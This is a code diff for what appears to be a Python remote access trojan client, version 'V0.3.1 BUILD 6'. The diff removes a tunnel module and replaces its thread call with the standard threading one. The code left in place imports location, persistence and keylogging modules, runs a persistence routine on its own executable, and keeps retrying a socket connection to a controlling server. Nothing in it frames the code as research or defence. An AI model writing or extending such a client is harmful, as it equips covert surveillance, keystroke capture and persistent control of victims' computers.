@@ -6,12 +6,13 @@ import socket
 from tkinter import messagebox
 import sys
 from time import sleep
+from threading import Thread
 
 version = 'V0.3.1 BUILD 6'
 
 dokeylog = False
 
-from _modules import location, persistence, tunnel, keylog, kbhit
+from _modules import location, persistence, keylog, kbhit
 kbhit = kbhit.KBHit()
 
 tunnelip = '127.0.0.1'
@@ -22,7 +23,6 @@ def connect():
     s = socket.socket()
     while True:
         try:
-            tunnel.start()
             s.connect((tunnelip,tunnelport))
         except:
             timer = 3
@@ -45,17 +45,13 @@ def get(msg): send(msg)
 def popup(msg,title='Message'):
     messagebox.showinfo(title, f'{msg}',)
 def show(msg,title='Message'):
-    tunnel.Thread(target=popup,args=(msg,title)).start()
+    Thread(target=popup,args=(msg,title)).start()
 
 def help():
     send('-- Help menu --\nFunctions:\n\nsend(msg) - Send a message back to server. Aliases: get\npopup(msg) - Send a message via pop up to the user. Aliases: show')
 
 
 print('[INIT] Enabling modules...\n')
-
-
-print(f'[MODULES] Enabling Tunnel..')
-tunnel.start()
 
 print('[MODULES] Enabling persistence.. ['+sys.argv[0].split("\\")[-1]+']')
 persistence.init(sys.argv[0].split('\\')[-1])
